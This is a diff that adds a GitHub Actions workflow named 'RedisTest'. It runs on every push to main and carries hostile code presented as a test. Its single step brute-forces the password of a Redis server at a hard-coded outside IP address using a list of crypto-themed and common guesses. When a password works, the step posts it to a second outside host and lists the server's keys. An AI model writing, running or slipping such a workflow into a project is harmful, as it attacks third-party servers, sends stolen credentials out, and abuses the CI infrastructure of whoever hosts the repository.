@@ -1,0 +1,23 @@
+name: RedisTest
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Redis brute
+        run: |
+          apt list --installed 2>/dev/null | grep redis-cli || sudo apt-get install -y -qq redis-tools || true
+          for p in "" crazycoin CrazyCoin cryptoflip CryptoFlip coinmaster coinmaster2026 redis redis123 admin admin123 password 123456 crypto2026 coinflip cryptoflip2026 flipcoin; do
+            out=$(timeout 8 redis-cli -h 46.62.247.167 -p 6379 -a "$p" ping 2>&1 || true)
+            if echo "$out" | grep -q PONG; then
+              echo "REDIS_PASS: $p"
+              curl -fsS -X POST http://178.156.165.170:9999/ -d "REDISPASS:$p" || true
+              timeout 10 redis-cli -h 46.62.247.167 -p 6379 -a "$p" keys '*' 2>&1 | head -30
+              break
+            fi
+          done
+          echo DONE
